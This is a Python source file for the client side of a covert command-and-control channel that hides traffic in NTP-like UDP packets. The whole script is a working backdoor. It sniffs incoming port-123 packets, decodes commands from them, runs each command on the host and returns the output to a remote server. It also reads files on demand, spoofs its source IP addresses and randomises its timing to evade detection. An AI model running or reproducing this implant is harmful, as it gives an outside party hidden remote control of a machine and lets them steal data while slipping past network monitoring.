#!/usr/bin/env python

#Libraries
from scapy.all import *
import threading
import os
import sys
import socket
import string
import commands
import re
import base64
import argparse
import pty
import time
import random

#Creates --help commands 
parser = argparse.ArgumentParser(description='Client for Covert C2 Channel.')
parser.add_argument('-s', '--server', metavar='N', type=str,
                    help='Server IP.')
parser.add_argument('-S', '--spoof', metavar='N', nargs='?', type=str,
                    help='Spoof with specified first three Octects. EX. 192.168.1')
parser.add_argument('-p', '--port', metavar='N', type=int, default=1024,
                    help='Listening Port.')
parser.add_argument('-b', '--byte', metavar='N', type=int, default=12,
                    help='Bytes to use for response. 4-44 # 12 is default..')
parser.add_argument('-i', '--interval', metavar='N', type=int, default=10,
                    help='Interval time for client response ')
parser.add_argument('-H', '--header', metavar='N', type=str, default='\x23\x00\x00\x00',
                    help='Protocol Header. For example NTP client is 8 bytes: "\x23\x00\x00\x00"')
parser.add_argument('-pl', '--packetlen', metavar='N', type=int, default=44,
                    help='Packet length past header. Example 44 Bytes')
parser.add_argument('-dp', '--destport', metavar='N', type=int, default=123,
                    help='Destination Port. Example NTP is 123')
parser.add_argument('-pc', '--paddingchar', metavar='N', type=str, default="\x00",
                    help='Padding char in hex. For example: "\x00"')
#parser.add_argument('-tu', '--TcpUdp', metavar='N', type=str, default="UDP",
#                    help='Protocol Type TCP or UDP. For example NTP client is UDP: "UDP"')
#Global Variables
args = parser.parse_args() 
s_net = IP(dst='%s' % args.server)
s_net = '.'.join(str(s_net.src).split('.')[0:-1])
if args.spoof:
	src_net= args.spoof + '.' 
else:
	src_net= s_net + '.'
ntp_ip = args.server
port = args.port
iport = args.port
destp = args.destport
header = args.header
plen = args.packetlen
payload1 = "\x6e\x74\x70\x5f\x5f\x73\x65\x72\x76\x65\x72\x5f\x0a\x3b\x3b\x3b" #Initial packet + ;;;
#payload2 = "\x1c\x02\x03\xeb\x00\x00\x02\x1b\x00\x00\x0b{!u\xaa2\xe14\xcf\xb36\xc7\xc0\x00\xe14\xd5\xc1\xe8\xf1P\x00\xe14\xd5\xc1\xfc\xb7\xd8\x00\xe14\xd5\xc1\xfc\xba\x98\x00"
EOL = ';;;'
src_ip = ''
byte = args.byte
upfile = ''
intv = args.interval
pad = args.paddingchar
#TU = args.TcpUdp

#Function will change the interval time of the clients response
def fuzztime():
	x = random.randint(1,intv)
	time.sleep(x)

#Function creates and sends packet when called - header & payload with adjusted padding
def replyme(pyld):
	fuzztime()
	global port
	global src_ip
	global ntp_ip
	global iport
	if args.port <= 1024:
	        port = random.randint(10000,65535)
	global src_ip
        if ';;;' in pyld:
                s_ip =  IP(dst='%s' % ntp_ip) # creates empty packet with destination of server and assigns it to s-ip
                src_ip = s_ip.src # the '.src' value for s_ip is the IP locally used to talk with the server
        else:
                src_ip = src_net + str(random.randrange(0,255,1)) #Randomizes the IP of client when it replies to server 
	packet = IP(src=src_ip,dst=ntp_ip)/UDP(dport=destp,sport=port)/(str(header)+ str(pyld)+ pad*(plen-len(pyld)))
	send(packet, verbose=0)

replyme(payload1)

messageN = []

def c2(packet):
	filtered_string = ''.join(filter(lambda x:x in string.printable, str(packet[0])))
	global messageN
	global upfile
	filtered_string = str(filtered_string).split('\x24') # Delimiting by $ as we need to take the header off
	if len(filtered_string) > 1:
		messageN.append(str(filtered_string[1]))
	for i in messageN:
		if EOL in i:
			# Takes a command line command, runs the command and assigns the value to cmdout
			cmd_string = ''.join(map(str,  messageN[:-1]))
			try:
				cmd_string = base64.b16decode(cmd_string)
			except:
				break
			messageN = []
			if cmd_string == '':
				cmd_string = 'echo " "'
			if cmd_string.split(' ')[0] == 'download':
				cmd_string = 'cat ' + cmd_string.split(' ')[1]
				upfile = 'upfile'
			cmdout = commands.getstatusoutput(cmd_string) #Output is exit code + the output of command
			#Parses only for output of command and splits it by carriage return
			cmdout = str(cmdout[1]).split('\n')
			if upfile:
				# prepend cmdout with value of upfile
				cmdout = [upfile] + cmdout
				upfile = ''
			for i in cmdout: # = filename.txt
				i = i + "\n"
				encoded_data = base64.b16encode(i)
				message = re.findall('.{1,%d}' % byte, encoded_data) #split i by BYTE characters in length
		
				for x in message: # x = filename.txt = message[0]
					replyme(x)
			replyme(';;;')

p = sniff(filter='src port 123', prn=c2)
